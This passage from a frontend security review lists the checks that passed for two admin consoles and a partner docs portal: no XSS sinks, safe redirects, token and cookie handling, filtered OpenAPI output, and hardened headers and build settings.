- **No XSS sinks in either console.** `grep` for `dangerouslySetInnerHTML|innerHTML|document.write|srcdoc|eval\(|new Function` across `apps/web-brand` and `apps/web-superadmin` returns nothing. All API strings (customer names, template bodies, chart labels) are rendered through React text nodes. Recharts tooltips use only `contentStyle` and a numeric `formatter` (`components/charts.tsx:47-166`), no custom `content` renderer. The messaging template preview renders as text with `whitespace-pre-wrap` (`messaging/page.tsx:136`), not as HTML.
- **No open redirects.** The only `window.location.href` assignment is the constant `/login` (`lib/api.ts:48` / `:27`); every `router.push` target is a template over an opaque ID under a fixed path prefix; no `?next=`/`returnTo` parameter is read by the consoles. The docs portal's `safeNextPath` (`lib/auth.ts:104-108`) rejects non-`/`-prefixed, `//`, backslash, `/access` and `/api/` targets before redirecting.
- **`href` with user data** is limited to `tel:` and `mailto:` prefixes (`customers/[membershipId]/page.tsx:123-124`, `customers/[personId]/page.tsx:169-170`); a `javascript:` scheme cannot be injected past the fixed prefix.
- **CSV/JSON exports** are fetched with the bearer header and downloaded via a `blob:` URL (`web-brand/lib/api.ts:164-176, 430-441`; `web-superadmin/lib/api.ts:229-239`); the token never rides on an anchor or query string.
- **Refresh tokens are never stored in the browser**; the consoles keep only the 15-minute access token and re-authenticate on 401.
- **No `NEXT_PUBLIC_*` secret leakage.** The complete list of public build vars is `NEXT_PUBLIC_API_URL` (both consoles), `NEXT_PUBLIC_BRAND_URL` (superadmin), `NEXT_PUBLIC_TERMINAL_API_BASE` (superadmin), `NEXT_PUBLIC_PORTAL_URL` (docs, documented only). All are URLs. No non-public env is referenced from any client component; `.env.local` files are untracked; no source maps are emitted; no `use server` functions exist.
- **Docs portal gate is sound for its version.** `middleware.ts:10-12` matcher covers everything except `/_next/`, `/brand/`, `/email/`, favicon/icon/robots, `/access` and `/api/access`; `openapi.json`, `/api/logout` and every guide/reference page sit behind `verifySession`. Session cookie is `httpOnly; Secure (prod); SameSite=Lax; Path=/` (`api/access/route.ts:27-33`); the readable twin cookie carries only the partner label. Code comparison is constant-time over SHA-256 digests and iterates every code (`lib/auth.ts:65-80`). `Cache-Control: private, no-store` is set on authenticated responses. Next 15.5.19 is past the CVE-2025-29927 middleware-bypass fix.
- **Partner OpenAPI is filtered.** `lib/openapi.ts:11-30` keeps only `/terminal/*` paths (minus `/terminal/app-version`) and only transitively-referenced schemas; admin/brand/customer surfaces are not served to partners. The API's own Swagger is off in production unless `API_DOCS_ENABLED=true` (`main.ts:66-70`).
- **Markdown rendering is repo-controlled only.** `marked` (no sanitiser) and `shiki` are fed exclusively from `apps/docs/content/guides/*.md` and `content/endpoints.ts` at build time; no guide contains `<script`, `<iframe` or `javascript:`; `inline()` in `components/endpoint.tsx:8-17` HTML-escapes before applying its two-token markup. An attacker needs commit access to inject HTML.
- **Docs headers present:** `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Robots-Tag: noindex, nofollow, noarchive` on every response plus `robots.ts` disallow-all.
- **Build config:** `reactStrictMode: true`; `typescript.ignoreBuildErrors` unset; `productionBrowserSourceMaps` unset; `pnpm install --frozen-lockfile` pinned in each `vercel.json`.
- **API hardening the consoles rely on** (observed, rated by agent 02): Helmet on the API, `ValidationPipe` with `forbidNonWhitelisted`, login/MFA throttled 10/min, structured error envelope consumed by `ApiError` (`web-brand/lib/api.ts:23-34`).
